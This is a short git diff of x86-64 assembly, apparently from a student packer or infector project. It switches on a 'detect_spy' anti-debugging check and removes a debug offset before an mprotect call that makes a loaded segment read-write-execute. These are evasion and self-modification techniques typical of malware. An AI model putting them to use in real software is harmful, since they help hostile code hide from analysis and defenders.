@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/06/10 19:14:41 by agrumbac         ###   ########.fr        ;
+;    Updated: 2019/06/10 20:51:03 by jfortin          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -93,15 +93,15 @@ mark_below:
 
 	add rsp, 16
 ;------------------------------; check if client behaves well (comment for debug)
-	; call detect_spy
-	; test rax, rax
-	; jnz return_to_client
+	call detect_spy
+	test rax, rax
+	jnz return_to_client
 ;------------------------------; make ptld writable
 	mov r8, [rsp + 32]         ; get ptld addr
 	mov r9, [rsp + 24]         ; get ptld len
 
 	;mprotect(ptld_addr, ptld_size, PROT_READ | PROT_WRITE | PROT_EXEC);
-add r9, 0x2df0;TMp DEBUG
+
 	mov rdi, r8
 	mov rsi, r9
 	mov rdx, PROT_RWX
